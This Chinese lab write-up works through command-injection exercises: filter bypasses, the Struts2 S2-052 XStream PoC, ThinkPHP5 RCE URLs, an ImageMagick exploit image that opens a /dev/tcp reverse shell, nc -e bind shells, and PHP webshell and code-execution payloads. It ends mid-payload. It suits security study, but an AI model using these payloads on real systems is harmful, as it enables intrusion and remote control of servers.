alt="image-20200426125326981"></p><p>由于实验机里没有nc工具就不尝试反弹shell了。</p><p>5)medium难度操作</p><p>通过fuzz发现&amp;&amp;和;被过滤了。</p><ul><li>127.0.0.1;dir</li></ul><p><img src="/assets/image-20200426130010047.png" alt="image-20200426130010047"></p><ul><li><p>127.0.0.1 &amp;&amp; dir</p><p><img src="/assets/image-20200426130102921.png" alt="image-20200426130102921"></p></li></ul><p>但是因为过滤不全所以可以用其他符号可以绕过，比如low中用的|</p><p>如果非要用&amp;&amp;可以使用下面方式：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span> &amp;;&amp; dir</span><br></pre></td></tr></table></figure><p>所以medium存在问题是使用黑名单，且黑名单机制不全。</p><h2 id="2-CVE-2017-9805Struts2-052漏洞实验"><a href="#2-CVE-2017-9805Struts2-052漏洞实验" class="headerlink" title="2. CVE-2017-9805Struts2-052漏洞实验"></a>2. CVE-2017-9805Struts2-052漏洞实验</h2><p>（1）实验介绍</p><p>实验链接：  <a href="http://www.hetianlab.com/expc.do?ce=c9b7ee13-33d3-4317-b31c-c9a80a8ad0a2" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=c9b7ee13-33d3-4317-b31c-c9a80a8ad0a2</a> </p><p>实验来源：合天网安实验室</p><p>实验目的： 了解S2-052 Struts2远程命令执行漏洞危害；掌握检测利用S2-052 Struts2远程命令执行漏洞技术</p><p>（2）实验操作</p><p>1）搭建实验环境。</p><p>tomcat开启。下载软件源代码，部署war文件。打开  <a href="http://127.0.0.1:8080/struts2-rest-showcase" target="_blank" rel="noopener">http://127.0.0.1:8080/struts2-rest-showcase</a> 网站进行测试，成功显示，环境搭建成功。然后配置burp进行抓包，注意tomcat默认端口为8080，所以burp可以改为8090端口。</p><p>2）正常业务</p><p>点击edit，随便输入内容提交，成功提交。</p><p>3）poc测试</p><p><img src="/assets/image-20200426141646790.png" alt="image-20200426141646790"></p><p>发现报错500，rce成功。而且弹出了计算器。</p><p>4）漏洞分析</p><p>XStreamHandler这个类对http请求中content-type是application/xml的，调用XStream进行处理。而XStreamHandler中的toObject()方法未对传入的值进行任何限制，导致XStream反序列化转化为对象时任意代码执行。</p><p>5）poc分析</p><p>poc:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span> <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span> <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt;</span> <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span> <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"</span>&gt;</span> <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">"javax.crypto.CipherInputStream"</span>&gt;</span> <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">"javax.crypto.NullCipher"</span>&gt;</span> <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span> <span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span> <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span> <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span> <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"java.util.Collections$EmptyIterator"</span>/&gt;</span> <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span> <span class="tag">&lt;<span class="name">command</span>&gt;</span> <span class="tag">&lt;<span class="name">string</span>&gt;</span>cacl<span class="tag">&lt;/<span class="name">string</span>&gt;</span> <span class="tag">&lt;/<span class="name">command</span>&gt;</span> <span class="tag">&lt;<span class="name">redirectErrorStream</span>&gt;</span>false<span class="tag">&lt;/<span class="name">redirectErrorStream</span>&gt;</span> <span class="tag">&lt;/<span class="name">next</span>&gt;</span> <span class="tag">&lt;/<span class="name">iter</span>&gt;</span> <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.ImageIO$ContainsFilter"</span>&gt;</span> <span class="tag">&lt;<span class="name">method</span>&gt;</span> <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span> <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span> <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span> <span class="tag">&lt;/<span class="name">method</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">name</span>&gt;</span> <span class="tag">&lt;/<span class="name">filter</span>&gt;</span> <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"string"</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">next</span>&gt;</span> <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span> <span class="tag">&lt;<span class="name">lock</span>/&gt;</span> <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder$NullInputStream"</span>/&gt;</span> <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span> <span class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span> <span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span> <span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span> <span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span> <span class="tag">&lt;/<span class="name">is</span>&gt;</span> <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span> <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span> <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span> <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span> <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span> <span class="tag">&lt;/<span class="name">value</span>&gt;</span> <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span> <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span> <span class="tag">&lt;/<span class="name">entry</span>&gt;</span> <span class="tag">&lt;<span class="name">entry</span>&gt;</span> <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span> <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>poc看不懂，分析是传入xml文件，估计下面语句</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;command&gt;</span><span class="symbol">&lt;string&gt;</span>C:\Windows\System32\calc.<span class="keyword">exe</span>&lt;/<span class="built_in">string</span>&gt;&lt;/<span class="keyword">command</span>&gt;</span><br></pre></td></tr></table></figure><p>被当作命令执行。</p><h2 id="3-Thinkphp5-远程命令执行漏洞"><a href="#3-Thinkphp5-远程命令执行漏洞" class="headerlink" title="3. Thinkphp5 远程命令执行漏洞"></a>3. Thinkphp5 远程命令执行漏洞</h2><p>（1）实验介绍</p><p>实验链接：   <a href="http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f</a> </p><p>实验来源：合天网安实验室</p><p>实验目的： 通过该实验了解ThinkPHP5远程命令执行漏洞的原因和利用方法，以及如何修复该漏洞。 </p><p>（2）实验操作</p><p>1）安装环境。</p><ul><li>利用<code>netstat -tunlp</code>检测是否开启AMP。注意php端口为9000。</li><li>下载ThinkPhp源码，并部署到apache的web目录下。换机器测试发现成功安装。</li></ul><p>2）实验操作</p><p>直接利用实验里带的ThinkPHP5漏洞检测工具。</p><p><img src="/assets/image-20200426144136346.png" alt="image-20200426144136346"></p><p>发现poc。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?s=/<span class="keyword">index</span>/\think\request\<span class="keyword">cache</span>&amp;key=<span class="number">1</span>|phpinfo</span><br></pre></td></tr></table></figure><p>测试</p><p><img src="/assets/image-20200426144439093.png" alt="image-20200426144439093"></p><p>发现正确。然后getshell.</p><p><img src="/assets/image-20200426144235821.png" alt="image-20200426144235821"></p><p>3）漏洞分析</p><p>a. $this-&gt;config-&gt;get(‘var_pathinfo’)是配置文件的默认值，初始化值为s 。而pathinfo来自<code>$_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]</code>，所以可以通过控制输入的参数s来控制pathinfo.</p><p>b. 特定条件下，path变量等于pathinfo控制。而path又被传入了router-&gt;check()函数，然后交给url解析。</p><p>c.解析url时，Url模块把url解析为三部分。模块/控制器/操作。而模块，控制器，操作都是可控的。</p><p>问题出在对控制器的处理中，如果发现控制器以反斜杠开始时，直接将其作为类名赋值给$class并返回，最后会实例化这个类。</p><p>e.Module.php中用param获取实例化类对应的参数，然后通过invokeMethod函数动态调用方法。</p><p>4）poc</p><p>poc不懂。。。</p><h2 id="4-ImageMagick漏洞"><a href="#4-ImageMagick漏洞" class="headerlink" title="4. ImageMagick漏洞"></a>4. ImageMagick漏洞</h2><p>（1）实验介绍</p><p>实验链接：   <a href="http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f</a> </p><p>实验来源：合天网安实验室</p><p>实验目的：掌握ImageMagick命令执行漏洞产生的原因、利用方法以及修复方法</p><p>（2）实验操作</p><p>1）检查ImageMagick版本</p><p><img src="/assets/image-20200426165939722.png" alt="image-20200426165939722"></p><p>版本号为6.8.9.</p><p>2）漏洞测试</p><p>创建exploit.png,其内容为：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill 'url(https://example.com/image.jpg<span class="string">"|ls "</span>-la)'</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>利用convert生成新文件：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">convert</span> <span class="selector-tag">exploit</span><span class="selector-class">.png</span> <span class="selector-tag">out</span><span class="selector-class">.png</span></span><br></pre></td></tr></table></figure><p>可以发现成功执行了ls -a命令。证明存在命令执行漏洞。</p><p>3）漏洞利用</p><p>在另外台机器上，输入10.1.1.9访问目标服务器。先上传一个正常文件。</p><p><img src="/assets/image-20200426171311315.png" alt="image-20200426171311315"></p><p>发现是用的ImageMagick工具转换的。</p><p>先下载 nc，并在本地开启监听。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -nvlp <span class="number">12301</span></span><br></pre></td></tr></table></figure><p>上传一个可以弹shell的图片。图片内容：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill 'url(https://example.com/image.jpg<span class="string">"|bash -i &gt;&amp; /dev/tcp/10.1.1.2/12301 0&gt;&amp;1"</span>)'</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>上传后shell反弹成功。</p><p><img src="/assets/image-20200426172341563.png" alt="image-20200426172341563"></p><p>4）漏洞分析</p><p>ImageMagick对于每种格式文件都指定了一种委托，对于https形式的文件处理方式为：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"wget"</span> -<span class="keyword">q</span> -O <span class="string">"%o"</span> <span class="string">"https:%M"</span></span><br></pre></td></tr></table></figure><p>而%M为输入的图片的url地址。由于是简单的字符串拼接，所以可以将引号闭合后通过管道符引入其他命令，形成了命令注入。</p><h2 id="5-web安全之命令执行漏洞理解"><a href="#5-web安全之命令执行漏洞理解" class="headerlink" title="5.web安全之命令执行漏洞理解"></a>5.web安全之命令执行漏洞理解</h2><h3 id="A-rce-ping"><a href="#A-rce-ping" class="headerlink" title="A.rce_ping"></a>A.rce_ping</h3><p>（1）正常业务</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span></span><br></pre></td></tr></table></figure><p>有回显。</p><p>（2）fuzz测试。</p><p>首先抓包</p><p><img src="/assets/image-20200426133832110.png" alt="image-20200426133832110"></p><p>发现有两个参数，一个参数一个命令。可以猜想可能使用了一些命令执行函数。比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>],<span class="variable">$return</span>);<span class="built_in">echo</span> <span class="variable">$return</span>;</span><br><span class="line"><span class="built_in">echo</span> system(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>]);</span><br><span class="line"><span class="built_in">echo</span> shell_exec(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>]);</span><br></pre></td></tr></table></figure><p>为了方便我们只对ipaddress这一选项进行fuzz测试。发现没有过滤。</p><p>（3）由于没有任何过滤所以直接写shell。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ipaddress</span>=127.0.0.1 | echo <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>['cmd']); ?&gt;"</span> &gt; shell.php &amp; <span class="attribute">submit</span>=ping</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200426140144644.png" alt="image-20200426140144644"></p><p>尝试连接：</p><p><img src="/assets/image-20200426140329896.png" alt="image-20200426140329896"></p><p>发现失败，估计没有写的权限。</p><p>（4）尝试shell</p><p>a.正向shell</p><p>服务器</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | nc -lvp <span class="number">7777</span> -e /bin/bash</span><br></pre></td></tr></table></figure><p>本机</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">47.105</span><span class="number">.75</span><span class="number">.177</span> <span class="number">7777</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200426173713380.png" alt="image-20200426173713380"></p><p>正向shell成功。</p><p>b.反弹shell</p><p>本机(自己的服务器)：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk <span class="number">7777</span></span><br></pre></td></tr></table></figure><p>远程服务器</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | bash -i &gt;&amp; /dev/tcp/xxxx/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>发现反弹不成功。</p><p>换台服务器尝试</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | bash -i &gt;&amp; /dev/tcp/xxx/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200426174407176.png" alt="image-20200426174407176"></p><p>反弹shell成功。</p><h3 id="B-rce-ping-2"><a href="#B-rce-ping-2" class="headerlink" title="B.rce_ping_2"></a>B.rce_ping_2</h3><p>直接fuzz测试。</p><p><img src="/assets/image-20200426174750306.png" alt="image-20200426174750306"></p><p>发现<code>; &amp;&amp;</code>被过滤了。</p><p>直接正向shell测试。</p><p>服务器</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | nc -lvp <span class="number">7778</span> -e /bin/bash</span><br></pre></td></tr></table></figure><p>本机</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">47.105</span><span class="number">.75</span><span class="number">.177</span> <span class="number">7778</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200426175011326.png" alt="image-20200426175011326"></p><h3 id="c-rce-ping-3"><a href="#c-rce-ping-3" class="headerlink" title="c.rce_ping_3"></a>c.rce_ping_3</h3><p>同样fuzz测试。</p><p><img src="/assets/image-20200426175113764.png" alt="image-20200426175113764"></p><p>发现过滤了<code>&amp; ;</code>同第三关一样的测试即可。</p><h3 id="D-rce-ping-4"><a href="#D-rce-ping-4" class="headerlink" title="D.rce_ping_4"></a>D.rce_ping_4</h3><p>页面500</p><h3 id="E-code"><a href="#E-code" class="headerlink" title="E.code"></a>E.code</h3><p>规定三种能力。（1）列出目录（2）写shell (3)反弹shell</p><h4 id="a-array-filter"><a href="#a-array-filter" class="headerlink" title="a.array_filter"></a>a.array_filter</h4><p>array_filter函数原型array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p><p>（1）列出目录</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">system</span>&amp;<span class="title">cmd</span>=<span class="title">ls</span></span></span><br></pre></td></tr></table></figure><p>成功列举目录</p><p>（2）写shell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">func</span>=system&amp;echo <span class="string">"&lt;?php <span class="variable">$_POST</span>[pass]&gt; ?&gt;"</span> &gt; shell.php</span><br></pre></td></tr></table></figure><p>发现还是不能上传shell???这里想探究下。</p><p><img src="/assets/image-20200426181415386.png" alt="image-20200426181415386"></p><p>当前为apache用户，该文件夹为root创建，而others只有执行和读的权力。</p><p>(3)反弹shell。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">system</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7781 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200426181654848.png" alt="image-20200426181654848"></p><p>反弹成功。</p><h4 id="b-array-map"><a href="#b-array-map" class="headerlink" title="b. array_map"></a>b. array_map</h4><p>array_map原型</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map ( callable $callback ,<span class="built_in"> array </span>$array1 [,<span class="built_in"> array </span>$... ] )</span><br></pre></td></tr></table></figure><p>同样直接</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">exec</span>&amp;<span class="title">nc</span> -<span class="title">lvp</span> 7782 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200426181922754.png" alt="image-20200426181922754"></p><h4 id="c-assert"><a href="#c-assert" class="headerlink" title="c.assert"></a>c.assert</h4><p>assert原型</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, <span class="built_in">string</span> $description ] )</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell<span class="constructor">_exec('<span class="params">nc</span> -<span class="params">lvp</span> 7783 -<span class="params">e</span> <span class="operator">/</span><span class="params">bin</span><span class="operator">/</span><span class="params">bash</span>')</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200426182118419.png" alt="image-20200426182118419"></p><h4 id="d-call-user-func"><a href="#d-call-user-func" class="headerlink" title="d.call_user_func"></a>d.call_user_func</h4><p>函数原型</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( callable <span class="symbol">$</span>callback [, mixed <span class="symbol">$</span><span class="keyword">parameter</span> [, mixed <span class="comment">$... ]] )</span></span><br></pre></td></tr></table></figure><p>列举目录下文件：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">ls</span></span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7784 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200426182340785.png" alt="image-20200426182340785"></p><h4 id="e-create-func"><a href="#e-create-func" class="headerlink" title="e.create_func"></a>e.create_func</h4><p>create_function ( string $args , string $code )</p><p>同样payload:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7785 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure><p>发现500了。。。。。。</p><h4 id="f-eval"><a href="#f-eval" class="headerlink" title="f.eval"></a>f.eval</h4><p>eval ( string $code )</p><p>直接shell。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">system</span><span class="params">(<span class="string">'nc -lvp 31321 -e /bin/bash'</span>)</span></span></span><br></pre></td></tr></table></figure><p>连接发现失败。查手册发现eval里的代码必须为PHP代码，且以分号结尾。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system('nc -lvp <span class="number">3132</span>1 -e /bin/bash');</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200426183223748.png" alt="image-20200426183223748"></p><p>成功反弹shell。</p><h4 id="g-preg-replace"><a href="#g-preg-replace" class="headerlink" title="g preg_replace"></a>g preg_replace</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, <span class="built_in">int</span> $limit = <span class="number">-1</span> [, <span class="built_in">int</span> &amp;$count ]] )</span><br></pre></td></tr></table></figure><p>直接cmd=phpinfo();</p><p><img src="/assets/image-20200426183515204.png" alt="image-20200426183515204"></p><p>反弹shell。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system('nc -lvp <span class="number">3132</span>2 -e /bin/bash');</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200426183623281.png" alt="image-20200426183623281"></p><h4 id="h-preg-replace2"><a href="#h-preg-replace2" class="headerlink" title="h preg_replace2"></a>h preg_replace2</h4><p>可以在双引号中使用</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$&#123;代码&#125;&#125;</span><br></pre></td></tr></table></figure><p>来执行代码</p><p>只能列出目录，</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=</span>[<span class="string">php</span>]&#123;$&#123;system(ls)&#125;&#125;[/php]</span><br></pre></td></tr></table></figure><p>正向shell出问题了。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=</span>[<span class="string">php</span>]&#123;$&#123;system(<span class="emphasis">'nc -lvp 31322 -e /bin/bash'</span>)&#125;&#125;[/php]</span><br></pre></td></tr></table></figure><h3 id="F-sys"><a href="#F-sys" class="headerlink" title="F.sys"></a>F.sys</h3><p>由于题目较多，所以只进行简单的测试。</p><ul><li><p>com 500错误</p></li><li><p>exec ls</p></li><li><p>exec_l ls       发现会以数组的形式返回。</p></li><li><p>fyh ls</p></li><li><p>passthru  ls -a</p></li><li><p>popen ls</p></li><li><p>popen_l ls 没反应。此题不会。。。</p></li><li><p>shell_exec ls</p></li><li><p>system  ls  </p></li></ul><h3 id="G-ThinkPHP-V5框架漏洞"><a href="#G-ThinkPHP-V5框架漏洞" class="headerlink" title="G.ThinkPHP V5框架漏洞"></a>G.ThinkPHP V5框架漏洞</h3><p>首先用dirsearch扫描，</p><p><img src="/assets/image-20200426185546367.png" alt="image-20200426185546367"></p><p><img src="/assets/image-20200426185648640.png" alt="image-20200426185648640"></p><p>发现个关键文件README.md，wget下载后发现是5.0版本的ThinkPHP.当然也可以随便输入文件报错看版本：v5.0.22.</p><p>可以用云悉探测。</p><p>搜索历史漏洞。ThinkPHP命令执行漏洞，其影响范围：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP <span class="number">5.0</span>系列 &lt;<span class="number">5.0</span><span class="number">.23</span>，ThinkPHP <span class="number">5.1</span>系列&lt; <span class="number">5.1</span><span class="number">.31</span>，以及基于ThinkPHP5二次开发的CMS，如AdminLTE后台管理系统、Thinkcmf、ThinkSNS等。</span><br></pre></td></tr></table></figure><p>所以直接利用</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?s=/<span class="keyword">index</span>/\think\request/<span class="keyword">cache</span>&amp;key=<span class="number">1</span>|phpinfo</span><br></pre></td></tr></table></figure><p>发现不成功。</p><p>利用网上的Poc</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=id</span><br></pre></td></tr></table></figure><p>利用成功</p><p><img src="/assets/image-20200426190132905.png" alt="image-20200426190132905"></p><p>正确写shell姿势</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span 